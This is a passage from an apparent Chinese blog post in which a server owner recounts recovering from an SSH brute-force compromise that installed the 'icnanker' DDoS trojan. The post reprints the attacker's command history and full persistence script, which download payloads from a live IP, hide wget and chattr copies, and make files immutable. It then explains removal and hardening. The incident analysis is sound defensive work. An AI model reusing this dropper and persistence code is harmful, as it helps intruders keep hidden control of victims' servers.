/usr/bin/wget<br>chmod 0 /usr/bin/chattr<br>lockr +i /usr/bin/chattr<br>chmod 0 /usr/lib/sftp-server<br>lockr +i /usr/lib/sftp-server<br>lockr -i /etc/hosts.deny;cp /etc/hosts.bak /etc/hosts.deny;lockr +i /etc/hosts.deny<br>sleep 30<br>done<br>&#x4ED4;&#x7EC6;&#x770B;&#x4E0B;&#x6765;&#xFF0C;&#x8FD9;&#x5E94;&#x8BE5;&#x662F;&#x201D;icnanker&#x201D;&#x7684;&#x540E;&#x53F0;&#x5B88;&#x62A4;&#x7A0B;&#x5E8F;&#xFF0C;&#x786E;&#x4FDD;&#x201D;icnanker&#x201D;&#x4E00;&#x76F4;&#x5728;&#x8FD0;&#x884C;&#x3002;</p>
+<p>&#x90A3;&#x201D;icnanker&#x201D;&#x7A76;&#x7ADF;&#x662F;&#x5E72;&#x4EC0;&#x4E48;&#x7684;&#xFF0C;&#x7A76;&#x7ADF;&#x5728;&#x6211;&#x7684;&#x7CFB;&#x7EDF;&#x4E0A;&#x5E72;&#x4E86;&#x4EC0;&#x4E48;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x8FD8;&#x6709;&#x4EC0;&#x4E48;&#x5176;&#x4ED6;&#x7684;&#x201C;&#x574F;&#x5BB6;&#x4F19;&#x201D;&#x5728;&#xFF1F;</p>
+<p>&#x5C1D;&#x8BD5;&#x6253;&#x5F00;&#x201C;icnanker&#x201D;&#xFF0C;&#x770B;&#x770B;&#x201C;icnanker&#x201D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x53D1;&#x73B0;&#x5B83;&#x662F;&#x4E8C;&#x8FDB;&#x5236;&#x7684;&#xFF0C;&#x65E0;&#x6CD5;&#x67E5;&#x770B;&#x8BE5;&#x6728;&#x9A6C;&#x7684;&#x5177;&#x4F53;&#x4F5C;&#x7528;&#x3002;&#x4F46;&#x662F;&#x6839;&#x636E; DO &#x7684;&#x68C0;&#x6D4B;&#x3001;apache2.sh&#x811A;&#x672C;&#x5185;&#x5BB9;&#x4EE5;&#x53CA;&#x201D;icnanker&#x201D;&#x4E00;&#x76F4;&#x5728;&#x8FDB;&#x884C;&#x7740;&#x7684;&#x5927;&#x91CF;tcp&#x94FE;&#x63A5;&#x5C1D;&#x8BD5;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x4F3C;&#x4E4E;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;DDoS&#x6728;&#x9A6C;&#xFF0C;syn flood&#x3002;</p>
+<p>&#x4E8E;&#x662F;&#x5F00;&#x59CB;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x641C;&#x7D22;&#x8BE5;&#x6728;&#x9A6C;&#x7684;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x4E00;&#x756A;&#x5C1D;&#x8BD5;&#x4E4B;&#x540E;&#xFF0C;&#x8FD8;&#x662F;&#x6CA1;&#x80FD;&#x627E;&#x5230;&#x5173;&#x4E8E;&#x8FD9;&#x4E2A;&#x6728;&#x9A6C;&#x7684;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x201C;&#x90A3;&#x5C31;&#x5148;&#x653E;&#x7740;&#xFF0C;&#x5148;&#x63EA;&#x51FA;&#x5176;&#x4ED6;&#x6728;&#x9A6C;&#x518D;&#x8BF4;&#x201D;&#x3002;</p>
+<p>&#x5168;&#x57CE;&#x641C;&#x67E5;<br>&#x6B64;&#x65F6;&#x7684;&#x6211;&#x6709;&#x70B9;&#x614C;&#x4E71;&#x548C;&#x65E0;&#x5934;&#x7EEA;&#xFF0C;&#x201C;&#x5BF9;&#x75C5;&#x6BD2;&#x4E00;&#x70B9;&#x90FD;&#x4E0D;&#x4E86;&#x89E3;&#x5462;&#x201D;&#xFF0C;&#x201C;&#x4E0D;&#x8FC7;&#xFF0C;&#x8FD9;&#x70B9;&#x95EE;&#x9898;&#x53EF;&#x96BE;&#x4E0D;&#x5012;&#x6211;&#xFF0C;&#x79FB;&#x6B65;google&#xFF01;&#x201D;</p>
+<p>&#x7ECF;&#x8FC7;&#x4E00;&#x756A;&#x67E5;&#x627E;&#x4E4B;&#x540E;&#xFF0C;&#x53D1;&#x73B0;&#x4E86; clamAV &#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x4E00;&#x4E2A;&#x5F88;popular&#x7684;&#x5F00;&#x6E90;&#x75C5;&#x6BD2;&#x5F15;&#x64CE;&#xFF0C;&#x80FD;&#x591F;&#x626B;&#x63CF;&#x68C0;&#x6D4B;&#x6728;&#x9A6C;&#x3001;&#x75C5;&#x6BD2;&#x548C;&#x6076;&#x610F;&#x7A0B;&#x5E8F;&#xFF0C;&#x6B63;&#x4E43;&#x6211;&#x6240;&#x9700;&#x554A;&#xFF01;&#xFF01;</p>
+<p>&#x9A6C;&#x4E0A;&#x7528; clamAV &#x795E;&#x5668;&#x626B;&#x63CF;&#x5168;&#x7AD9;&#x6587;&#x4EF6;&#xFF0C;&#x679C;&#x7136;&#x8FD8;&#x53D1;&#x73B0;&#x4E86;&#x4E0D;&#x5C11;&#x5176;&#x4ED6;&#x7684;&#x6728;&#x9A6C;&#xFF1A;</p>
+<p>/usr/bin/icnanker<br>/usr/bin/.filebak<br>/usr/bin/.sshd<br>/usr/bin/lsof<br>/usr/bin/bsd-port/getty<br>/bin/ps<br>/bin/netstat<br>/bin/ss<br>Oh, no&#xFF01;&#xFF01;&#xFF01;</p>
+<p>ps, netstat, ss, lsof &#x8FD9;&#x4E9B;&#x5F88;&#x5E38;&#x7528;&#x7684;&#x76D1;&#x63A7;&#x670D;&#x52A1;&#x5668;&#x72B6;&#x6001;&#x7684;&#x7CFB;&#x7EDF;&#x5DE5;&#x5177;&#x5168;&#x90E8;&#x88AB;&#x6389;&#x5305;&#x4E86;&#xFF01;</p>
+<p>&#x201C;&#x771F;&#x662F;&#x5371;&#x9669;&#xFF0C;&#x8981;&#x662F;&#x6CA1;&#x6709;&#x5728;&#x5168;&#x673A;&#x8FDB;&#x884C;&#x75C5;&#x6BD2;&#x641C;&#x7D22;&#x7684;&#x8BDD;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x5C31;&#x4F1A;&#x53C8;&#x88AB;&#x83AB;&#x540D;&#x5176;&#x5999;&#x7684;&#x611F;&#x67D3;&#x4E86;&#xFF01;&#x201D;&#xFF0C;&#x5FC3;&#x91CC;&#x76F4;&#x5192;&#x51B7;&#x6C57;&#x3002;</p>
+<p>&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x7684;&#x8868;&#x60C5;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p>
+<img src="/2018/03/30/&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E4B;&#x540E;&#x7684;&#x5FC3;&#x8DEF;&#x5386;&#x7A0B;/3.jpg">
+<p>&#x55EF;&#xFF0C;&#x5FC3;&#x60C5;&#x975E;&#x5E38;&#x6C89;&#x91CD;&#x3002;&#x975E;&#x5E38;&#x6C89;&#x91CD;&#x3002;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x7684;&#x6C89;&#x91CD;&#x3002;</p>
+<p>&#x6000;&#x7740;&#x6C89;&#x91CD;&#x7684;&#x5FC3;&#x60C5;&#xFF0C;&#x5F00;&#x59CB;&#x51FA;&#x5176;&#x610F;&#x6599;&#x7684;&#x51B7;&#x9759;&#x601D;&#x8003;&#xFF0C;&#x5F97;&#x51FA;&#x4EE5;&#x4E0B;&#x63A8;&#x65AD;&#xFF08;&#x4E8B;&#x5B9E;&#xFF09;&#xFF1A;</p>
+<p>&#x653B;&#x51FB;&#x8005;&#x5229;&#x7528;&#x66B4;&#x7834;&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#xFF0C;1&#x6708;26&#x53F7;&#x6210;&#x529F;&#x7A81;&#x7834;&#xFF0C;1&#x6708;28&#x53F7;&#x79CD;&#x4E0B;&#x6728;&#x9A6C;&#xFF0C;29&#x53F7;&#x5F00;&#x59CB;&#x8FDB;&#x884C;tcp syn flood,flood&#x6301;&#x7EED;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x540E;&#xFF0C;&#x88AB;DO&#x68C0;&#x6D4B;&#x5230;&#xFF0C;&#x5C01;&#x4E86;&#x6211;&#x7684;&#x4E3B;&#x673A;&#x3002;<br>&#x653B;&#x51FB;&#x8005;&#x6CA1;&#x6709;&#x6E05;&#x9664;&#x65E5;&#x5FD7;&#xFF0C;&#x6CA1;&#x6709;&#x505A;&#x5BF9;&#x673A;&#x5668;&#x6709;&#x6781;&#x5927;&#x7834;&#x574F;&#x6027;&#x7684;&#x4E8B;&#x60C5;&#x3002;<br>&#x653B;&#x51FB;&#x8005;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;&#x79CD;&#x4E0B;&#x201D;icnanker&#x201D;&#x8FD9;&#x4E00;&#x4E2A;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#x6728;&#x9A6C;&#xFF0C;&#x8FD8;&#x7528;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x6728;&#x9A6C;&#x6389;&#x5305;&#x4E86;&#x672C;&#x673A;&#x4E0A;&#x7684;&#x5173;&#x952E;&#x7A0B;&#x5E8F;&#x3002;<br>&#x90A3;&#x4E48;&#xFF0C;&#x6211;&#x9700;&#x8981;&#x53CD;&#x6297;&#x4E86;&#x3002;</p>
+<p>&#x6740;&#x6389;&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;</p>
+<h1 id="kill-13648-&#x6740;&#x6389;apache2-sh"><a href="#kill-13648-&#x6740;&#x6389;apache2-sh" class="headerlink" title="kill 13648  # &#x6740;&#x6389;apache2.sh"></a>kill 13648  # &#x6740;&#x6389;apache2.sh</h1><h1 id="kill-14519-&#x6740;&#x6389;&#x201D;icnanker&#x201D;"><a href="#kill-14519-&#x6740;&#x6389;&#x201D;icnanker&#x201D;" class="headerlink" title="kill 14519  # &#x6740;&#x6389;&#x201D;icnanker&#x201D;"></a>kill 14519  # &#x6740;&#x6389;&#x201D;icnanker&#x201D;</h1><h1 id="kill-26595-&#x6740;&#x6389;-sshd"><a href="#kill-26595-&#x6740;&#x6389;-sshd" class="headerlink" title="kill 26595  # &#x6740;&#x6389;.sshd"></a>kill 26595  # &#x6740;&#x6389;.sshd</h1><p>&#x6E05;&#x9664;&#x6728;&#x9A6C;</p>
+<p>&#x518D;&#x6B21;&#x67E5;&#x770B;&#x547D;&#x4EE4;&#x8BB0;&#x5F55;&#x548C;apache2.sh&#xFF0C;&#x786E;&#x5B9A;&#x6E05;&#x9664;&#x6728;&#x9A6C;&#x7684;&#x6B65;&#x9AA4;&#xFF1A;</p>
+<h1 id="history-1"><a href="#history-1" class="headerlink" title="history"></a>history</h1><p>(&#x2026;)<br>    4  cp /usr/bin/wget /usr/bin/vget<br>    5  cp /usr/bin/chattr /usr/bin/lockr<br>    6  chmod 0 /usr/bin/chattr;chmod 0 /usr/bin/wget<br>    7  lockr +i /usr/bin/chattr;lockr +i /usr/bin/wget<br>    8  chmod 0755 /usr/bin/vget;chmod 0755 /usr/bin/lockr<br>    9  vget <a href="http://183.60.149.202:8080/apache2.sh" target="_blank" rel="noopener">http://183.60.149.202:8080/apache2.sh</a><br>    10  mv /root/apache2.sh /etc/init.d/apache2.sh<br>    11  chmod 0755 /etc/init.d/apache2.sh<br>    12  nohup sh /etc/init.d/apache2.sh &gt;/dev/null 2&gt;&amp;1 &amp;<br>    13  lockr +i /etc/init.d/apache2.sh<br>    14  vi /etc/rc.local<br>    15  lockr +i /etc/rc.local<br>    16  less /etc/init.d/apache2.sh</p>
+<h1 id="cat-etc-init-d-apache2-sh-1"><a href="#cat-etc-init-d-apache2-sh-1" class="headerlink" title="cat /etc/init.d/apache2.sh"></a>cat /etc/init.d/apache2.sh</h1><p>#!/bin/sh<br>while [ 1 -gt 0 ];do<br>Get=&#x201D;/usr/bin/vget&#x201D;<br>Lok=&#x201D;/usr/bin/lockr&#x201D;<br>Bak=&#x201D;/usr/bin/.filebak&#x201D;<br>hosts=&#x201D;/etc/hosts.bak&#x201D;<br>File=&#x201D;/usr/bin/icnanker&#x201D;<br>if [ ! -f  &#x201C;$hosts&#x201D; ];then<br>    cp -f /etc/hosts.deny /etc/hosts.bak<br>    lockr +i /etc/hosts.bak<br>fi<br>if [ ! -f  &#x201C;$Lok&#x201D; ];then<br>    cp -f /usr/bin/chattr /usr/bin/lockr<br>    cp -f /usr/bin/chattr /usr/bin/.locks<br>    cp -f /usr/bin/.locks /usr/bin/lockr<br>    chmod 0755 /usr/bin/lockr<br>    chmod 0755 /usr/bin/.locks<br>    lockr +i /usr/bin/lockr<br>    lockr +i /usr/bin/.locks<br>fi<br>if [ ! -f  &#x201C;$Get&#x201D; ];then<br>    cp -f /usr/bin/wget /usr/bin/vget<br>    cp -f /usr/bin/wget /usr/bin/.bget<br>    cp -f /usr/bin/.bget /usr/bin/vget<br>    chmod 0755 /usr/bin/vget<br>    chmod 0755 /usr/bin/.bget<br>    lockr +i /usr/bin/vget<br>    lockr +i /usr/bin/.bget<br>fi<br>Exist=<code>ss|grep 183.60.149.202:43200|grep -v &quot;grep&quot;</code><br>if [ -z &#x201C;$Exist&#x201D; ];then<br>    lockr -i /usr/bin/.filebak<br>    lockr -i /usr/bin/icnanker<br>    chmod 0755 /usr/bin/.filebak<br>    chmod 0755 /usr/bin/icnanker<br>    if [ ! -f  &#x201C;$File&#x201D; ];then<br>        if [ ! -f  &#x201C;$Bak&#x201D; ];then<br>            rm -f /etc/init.d/icnanker;rm -f /etc/init.d/icnanker.1<br>            vget -P /etc/init.d/ vget <a href="http://183.60.149.202:8080/icnanker" target="_blank" rel="noopener">http://183.60.149.202:8080/icnanker</a><br>            mv /etc/init.d/icnanker /usr/bin/icnanker<br>        else<br>            cp -f /usr/bin/.filebak /usr/bin/icnanker<br>        fi<br>    fi<br>    pkill icnanker;pkill icnanker<br>    chmod 0755 /usr/bin/icnanker<br>    lockr +i /usr/bin/icnanker<br>    /usr/bin/icnanker<br>fi<br>if [ ! -f  &#x201C;$Bak&#x201D; ];then<br>    cp -f /usr/bin/icnanker /usr/bin/.filebak<br>    chmod 0755 /usr/bin/.filebak<br>    lockr +i /usr/bin/.filebak<br>fi<br>chmod 0 /usr/bin/wget<br>lockr +i /usr/bin/wget<br>chmod 0 /usr/bin/chattr<br>lockr +i /usr/bin/chattr<br>chmod 0 /usr/lib/sftp-server<br>lockr +i /usr/lib/sftp-server<br>lockr -i /etc/hosts.deny;cp /etc/hosts.bak /etc/hosts.deny;lockr +i /etc/hosts.deny<br>sleep 30<br>done<br>&#x54FC;&#xFF0C;&#x256D;(&#x256F;^&#x2570;)&#x256E;&#xFF0C;&#x5C45;&#x7136;&#x6562;&#x8FD9;&#x6837;&#x73A9;&#x6211;&#x3002;&#x8FD9;&#x51E0;&#x884C;&#x547D;&#x4EE4;&#x548C;&#x811A;&#x672C;&#x8BD5;&#x56FE;&#x5E72;&#x6270;&#x6211;&#x628A;&#x75C5;&#x6BD2;&#x4ECE;&#x673A;&#x5668;&#x4E0A;&#x5220;&#x9664;&#x54CE;&#xFF1A;</p>
+<p>&#x7B2C;&#x4E00;&#x6B65;&#xFF0C; &#x5C06;/usr/bin/chattr&#x590D;&#x5236;&#x5230;/usr/bin/lockr</p>
+<p>cp /usr/bin/chattr /usr/bin/lockr</p>
+<p>&#x7B2C;&#x4E8C;&#x6B65;&#xFF0C; &#x5C06;chattr&#x53D8;&#x4E3A;&#x4E0D;&#x53EF;&#x8BFB;&#x4E0D;&#x53EF;&#x5199;&#x4E0D;&#x53EF;&#x6267;&#x884C;&#x7684;&#x6743;&#x9650;</p>
+<p>chmod 0 /usr/bin/chattr</p>
+<p>&#x7B2C;&#x4E09;&#x6B65;&#xFF0C; &#x9501;&#x4F4F;chattr&#xFF0C;&#x8BA9;&#x5176;&#x53D8;&#x4E3A;&#x4E0D;&#x53EF;&#x4FEE;&#x6539;</p>
+<p>lockr +i /usr/bin/chattr</p>
+<p>&#x7B2C;&#x56DB;&#x6B65;&#xFF0C; &#x9501;&#x4F4F;&#x6240;&#x6709;&#x5176;&#x4ED6;&#x6728;&#x9A6C;&#xFF0C;&#x8BA9;&#x5176;&#x4E0D;&#x53EF;&#x5220;&#x9664;&#xFF0C;&#x5982;icnanker&#x7B49;&#x3002;</p>
+<p>lockr +i /usr/bin/icnanker</p>
+<p>&#x7B2C;&#x4E94;&#x6B65;&#xFF0C; &#x5C06;&#x6728;&#x9A6C;&#x7A0B;&#x5E8F;&#x52A0;&#x5165;&#x7CFB;&#x7EDF;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x811A;&#x672C;&#xFF08; /etc/rc.local &#xFF09;&#x4E2D;&#xFF0C;&#x6BCF;&#x6B21;&#x5F00;&#x673A;&#x81EA;&#x52A8;&#x8FD0;&#x884C;&#x6728;&#x9A6C;&#x3002;</p>
+<p>&#x8FD9;&#x6837;&#x4E00;&#x6765;&#xFF0C; &#x5982;&#x679C;&#x4E0D;&#x61C2;&#x8FD9;&#x6BB5;&#x903B;&#x8F91;&#x7684;&#x8BDD;&#xFF0C; &#x8981;&#x5220;&#x9664;&#x75C5;&#x6BD2;&#x5982;icnanker&#x90FD;&#x4F1A;&#x88AB;&#x83AB;&#x540D;&#x5176;&#x5999;&#x88AB;&#x62D2;&#x7EDD;&#x4E86;&#xFF1A;</p>
+<h1 id="rm-usr-bin-icnanker"><a href="#rm-usr-bin-icnanker" class="headerlink" title="rm /usr/bin/icnanker"></a>rm /usr/bin/icnanker</h1><p>rm: cannot remove &#x2018;icnanker&#x2019;: Operation not permitted<br>&#x5E78;&#x597D;&#xFF0C; &#x6211;&#x8FD9;&#x4E2A;&#x4EBA;&#x6709;&#x975E;&#x5E38;&#x53EF;&#x6015;&#x7684;&#x8010;&#x5FC3;&#x3002;&#x9A6C;&#x4E0A;&#x53BB;&#x67E5;&#x4E86;chattr&#x662F;&#x5E72;&#x4EC0;&#x4E48;&#x7684;&#x3002;&#x539F;&#x6765;&#xFF0C;linux&#x7684;&#x6587;&#x4EF6;&#x8FD8;&#x80FD;&#x8BBE;&#x7F6E;&#x4E00;&#x4E9B;&#x9644;&#x5E26;&#x7684;&#x5C5E;&#x6027;&#x3002;&#x6BD4;&#x5982;&#x6709;&#x4E00;&#x4E2A;&#x5C5E;&#x6027;&#x2019;i&#x2019;&#xFF0C;&#x5B83;&#x7684;&#x610F;&#x601D;&#x5C31;&#x662F;&#x201D;immutable&#x201D;&#xFF0C;&#x5373;&#x9650;&#x5236;&#x6587;&#x4EF6;&#x4E0D;&#x53EF;&#x66F4;&#x6539;&#xFF08;&#x5220;&#x9664;&#x3001;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3001;&#x6539;&#x53D8;&#x6587;&#x4EF6;&#x6743;&#x9650;&#x7B49;&#xFF09;&#x3002;&#x90A3;&#x4E48;&#x901A;&#x8FC7;lockr +i /usr/bin/icnanker&#xFF0C;&#x7ED9;icnanker&#x9644;&#x4E0A;&#x4E86;&#x2019;i&#x2019;&#x5C5E;&#x6027;&#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x8BA9;&#x6211;&#x6CA1;&#x529E;&#x6CD5;&#x5220;&#x9664;icnanker&#x4E86;&#xFF01;</p>
+<p>&#x201C;&#x90A3;&#x628A;icnanker&#x7684;&#x2019;i&#x2019;&#x5C5E;&#x6027;&#x53BB;&#x9664;&#x5457;&#x201D;&#xFF0C; &#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x76F4;&#x63A5;&#x7684;&#x60F3;&#x6CD5;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x8D27;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x6211;&#x8FD9;&#x4E48;&#x505A;&#xFF0C;&#x8FD8;&#x8BB0;&#x5F97;&#x5417;&#xFF0C;&#x5B83;&#x628A; chattr &#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x901A;&#x8FC7; chmod 0 /usr/bin/chattr&#x547D;&#x4EE4;&#x5C06;chattr&#x7684;&#x6267;&#x884C;&#x6743;&#x9650;&#x53BB;&#x9664;&#x4E86;&#x3002;&#x6362;&#x8A00;&#x4E4B;&#xFF0C;&#x6211;&#x6CA1;&#x6CD5;&#x8FD0;&#x884C;chattr&#x6765;&#x53BB;&#x9664;icnanker&#x7684;&#x2019;i&#x2019;&#x5C5E;&#x6027;&#xFF01;</p>
+<p>&#x90A3;&#x662F;&#x4E0D;&#x662F;&#x5C31;&#x6CA1;&#x529E;&#x6CD5;&#x5220;&#x9664;&#x8FD9;&#x4E9B;&#x6728;&#x9A6C;&#x4E86;&#x5462;&#xFF1F;</p>
+<p>NO&#xFF0C;NO&#xFF0C;NO&#x3002;&#x5C06;&#x8BA1;&#x5C31;&#x8BA1;&#x5C31;&#x597D;&#x4E86;&#x3002;</p>
+<p>&#x8FD8;&#x8BB0;&#x5F97;&#x5417;&#xFF0C; &#x4E0A;&#x9762;&#x90A3;&#x6BB5;&#x811A;&#x672C;&#xFF0C;&#x628A;/usr/bin/chattr&#x590D;&#x5236;&#x5230;&#x4E86;/usr/bin/lockr&#x3002;&#x90A3;&#x6211;&#x76F4;&#x63A5;&#x4F7F;&#x7528;lockr&#x628A;chattr&#x89E3;&#x9501;&#x4E0D;&#x5C31;&#x884C;&#x4E86;&#xFF1F;</p>
+<h1 id="lockr-i-usr-bin-chattr"><a href="#lockr-i-usr-bin-chattr" class="headerlink" title="lockr -i /usr/bin/chattr"></a>lockr -i /usr/bin/chattr</h1><h1 id="chmod-755-usr-bin-chattr"><a href="#chmod-755-usr-bin-chattr" class="headerlink" title="chmod 755 /usr/bin/chattr"></a>chmod 755 /usr/bin/chattr</h1><h1 id="chattr-i-usr-bin-icnanker"><a href="#chattr-i-usr-bin-icnanker" class="headerlink" title="chattr -i /usr/bin/icnanker"></a>chattr -i /usr/bin/icnanker</h1><h1 id="rm-usr-bin-icnanker-1"><a href="#rm-usr-bin-icnanker-1" class="headerlink" title="rm /usr/bin/icnanker"></a>rm /usr/bin/icnanker</h1><p>(&#x2026;)<br>&#x5475;&#x5475;&#xFF0C;&#x8FD9;&#x6837;&#xFF0C;&#x5C31;&#x628A;&#x653B;&#x51FB;&#x8005;&#x8BBE;&#x4E0B;&#x7684;&#x5708;&#x5957;&#x4E00;&#x4E0B;&#x5C31;&#x89E3;&#x5F00;&#x4E86;&#x3002;&#x505A;&#x5230;&#x8FD9;&#x91CC;&#x6211;&#x89C9;&#x5F97;&#x653B;&#x51FB;&#x8005;&#x7684;&#x667A;&#x5546;&#x5176;&#x5B9E;&#x503C;&#x5F97;&#x5546;&#x69B7;&#x7684;&#x3002;&#x6211;&#x5728;&#x667A;&#x5546;&#x4E0A;&#xFF0C;&#x5176;&#x5B9E;&#x5E94;&#x8BE5;&#x66F4;&#x9AD8;&#x4E00;&#x7B79;&#x3002;&#x5C0F;&#x5C0F;&#x7684;&#x81EA;&#x5A31;&#x81EA;&#x4E50;&#x4E86;&#x4E00;&#x628A;&#x3002;&#x3002;&#x3002;</p>
+<p>&#x6728;&#x9A6C;&#xFF0C;&#x5C31;&#x8FD9;&#x6837;&#x4E00;&#x6B65;&#x4E00;&#x6B65;&#x7684;&#x5168;&#x90E8;&#x88AB;&#x6211;&#x641C;&#x96C6;&#x8D77;&#x6765;&#xFF0C;&#x8FC7;&#x4E9B;&#x65F6;&#x5019;&#x51C6;&#x5907;&#x4E00;&#x628A;&#x706B;&#x70E7;&#x4E86;&#x5B83;&#x3002;</p>
+<p>&#x63A5;&#x4E0B;&#x6765;&#xFF0C;&#x662F;&#x601D;&#x8003;&#x5BF9;&#x7B56;&#x7684;&#x65F6;&#x5019;&#x4E86;&#x3002;&#x8FD9;&#x6B21;&#x66B4;&#x7834;&#x8868;&#x9762;&#x4E0A;&#x5168;&#x662F;&#x5F31;&#x53E3;&#x4EE4;&#x60F9;&#x7684;&#x7978;&#xFF0C;&#x5176;&#x5B9E;&#x8FD8;&#x662F;&#x56E0;&#x4E3A;&#x592A;&#x61D2;&#xFF0C;&#x660E;&#x660E;&#x77E5;&#x9053;&#x5F88;&#x5371;&#x9669;&#xFF0C;&#x5374;&#x5B58;&#x5728;&#x4FA5;&#x5E78;&#x5FC3;&#x7406;&#x3002;&#x201C;&#x55EF;&#xFF0C;&#x8FD9;&#x6B21;&#x4E00;&#x5B9A;&#x8981;&#x91C7;&#x53D6;&#x5168;&#x9762;&#x7684;&#x5B89;&#x5168;&#x7B56;&#x7565;&#xFF01;&#x201D;</p>
+<p>&#x8FDB;&#x884C;&#x4E00;&#x4E9B;&#x7814;&#x7A76;&#x4E4B;&#x540E;&#xFF0C;&#x51C6;&#x5907;&#x4ECE;&#x4E24;&#x4E2A;&#x5927;&#x65B9;&#x5411;&#x5165;&#x624B;&#xFF0C;&#x9632;&#x62A4;&#x673A;&#x5236;&#x548C;&#x68C0;&#x6D4B;&#x673A;&#x5236;&#x3002;&#x4E00;&#x4E2A;&#x662F;&#x52A0;&#x5F3A;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x589E;&#x52A0;&#x4ED6;&#x4EEC;&#xFF08;hacker&#xFF09;&#x8FDB;&#x653B;&#x96BE;&#x5EA6;&#x3002;&#x53E6;&#x4E00;&#x4E2A;&#x662F;&#x52A0;&#x5F3A;&#x8B66;&#x6212;&#xFF0C;&#x4E00;&#x65E6;&#x53D1;&#x73B0;&#x6709;&#x4EBA;&#x5165;&#x4FB5;&#xFF0C;&#x80FD;&#x7ACB;&#x9A6C;&#x77E5;&#x9053;&#x5E76;&#x4E14;&#x5FEB;&#x901F;&#x54CD;&#x5E94;&#x3002;</p>
+<p>&#x5EFA;&#x7ACB;&#x57CE;&#x5899;<br>&#xFF08;SSH&#xFF09;&#x767B;&#x5F55;&#x5B89;&#x5168;&#x7B56;&#x7565;</p>
+<ul>
+<li><strong>&#x4F7F;&#x7528;&#x5F3A;&#x5BC6;&#x7801;&#xFF01;&#xFF01;</strong>&#x7EDD;&#x5927;&#x591A;&#x6570;&#x66B4;&#x7834;&#x90FD;&#x662F;&#x56E0;&#x4E3A;&#x8BE5;&#x6B7B;&#x7684;&#x5F31;&#x53E3;&#x4EE4;&#xFF01;</li>
+<li><strong>&#x8BBE;&#x7F6E;ssh&#x4E0D;&#x5141;&#x8BB8;root&#x767B;&#x5F55;&#xFF01;</strong>&#x56E0;&#x4E3A;&#x5927;&#x591A;&#x6570;&#x767B;&#x5F55;&#x66B4;&#x7834;&#x90FD;&#x662F;&#x5BF9;&#x4E8E;root&#x7528;&#x6237;&#x8FDB;&#x884C;&#x66B4;&#x7834;&#x7684;&#xFF01;</li>
+<li><strong>&#x4E0D;&#x8981;&#x6CC4;&#x9732;&#x4E3B;&#x673A;&#x7528;&#x6237;&#x540D;&#x7B49;&#x4FE1;&#x606F;&#xFF01;&#xFF01;</strong>&#x8FD9;&#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x9488;&#x5BF9;&#x6027;&#x66B4;&#x7834;&#xFF0C;&#x5982;&#x679C;&#x522B;&#x4EBA;&#x77E5;&#x9053;&#x4F60;&#x7684;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x53C8;&#x5BF9;&#x4F60;&#x6709;&#x4E00;&#x4E9B;&#x4E86;&#x89E3;&#x7684;&#x8BDD;&#xFF0C;&#x5176;&#x731C;&#x4E2D;&#x4F60;&#x5BC6;&#x7801;&#x7684;&#x6982;&#x7387;&#x4F1A;&#x5927;&#x5927;&#x52A0;&#x5927;&#x3002;</li>
+<li><strong>&#x68C0;&#x67E5;&#x66B4;&#x7834;IP&#x5E76;&#x4E14;&#x5C01;&#x7981;&#x4E4B;&#xFF01;</strong>&#x6709;&#x4E2A;&#x975E;&#x5E38;&#x597D;&#x7528;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x5927;&#x540D;&#x4E3A;&#x201C;fail2ban&#x201D;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x626B;&#x63CF;&#x4E3B;&#x673A;&#x7684;&#x767B;&#x5F55;&#x65E5;&#x5FD7;&#xFF0C;&#x5E76;&#x4E14;&#x9650;&#x5236;&#x5355;IP&#x5931;&#x8D25;&#x767B;&#x5F55;&#x6B21;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x8D85;&#x8FC7;&#x9650;&#x5236;&#xFF0C;&#x5C31;&#x4F1A;&#x5C01;&#x7981;&#x8BE5;IP&#x3002;<br>&#x9632;&#x706B;&#x5899;</li>
+</ul>
